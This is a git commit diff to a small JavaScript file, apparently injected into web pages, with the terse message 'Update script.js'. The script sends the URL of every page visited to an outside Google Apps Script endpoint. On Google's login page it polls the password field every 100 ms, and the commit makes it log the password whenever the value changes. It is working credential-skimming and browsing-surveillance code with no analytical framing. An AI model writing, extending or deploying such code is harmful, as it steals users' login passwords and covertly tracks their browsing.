728559f5257f07750bd61ba9824557ae10e5eb30
Josh Chang <joshchang04@gmail.com>
2021-03-16 12:14:36 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,11 @@
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
 if(window.location.host === 'accounts.google.com'){
   var password = $("input[type='password']");
+  var currentVal = password.attr('data-initial-value');
   setInterval(() => {
-    console.log(password.attr('data-initial-value'));
+    if(password.attr('data-initial-value') !== currentVal){
+      currentVal = password.attr('data-initial-value');
+      console.log(currentVal);
+    }
   }, 100);
 }
